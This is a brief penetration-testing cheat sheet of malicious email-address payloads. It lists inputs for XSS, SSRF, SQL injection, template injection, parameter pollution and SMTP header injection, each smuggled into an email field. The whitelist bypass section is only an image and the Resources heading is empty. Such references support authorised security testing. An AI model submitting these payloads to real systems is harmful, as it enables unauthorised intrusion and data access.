# Email payloads

## Email payloads

### XSS 

`polo+(<script>alert(0)</script>)@target.com`

`polo@target.com(<script>alert(1)</script>).com`

`"<script>alert(1)</script>"@target.com`

### SSRF

`polo@[127.0.0.1]`

`polo@something.burpcollaborator.test`

### SQLI

`"' OR 1=1 -- '"@target.com`

`"mail'); Select * from Users;--"@target.com`

### Template Injection

`"<%= 2 * 2 %>"@target.com`

`polo+(${{ 2 * 2 }})@target.com`

### Wildcard

`%@target.com`

### Parameter pollution

`polo&email=test@target.o r g`

### Email headers injection

`"%0d%0aContent-Length:%200%0d%0a%0d%0a"@test.test`

`"erf@target.com>\r\nRCPT TO:<polo+"@test.test`

### Whitelist bypass

![](../../.gitbook/assets/image%20%2895%29.png)

### Resources





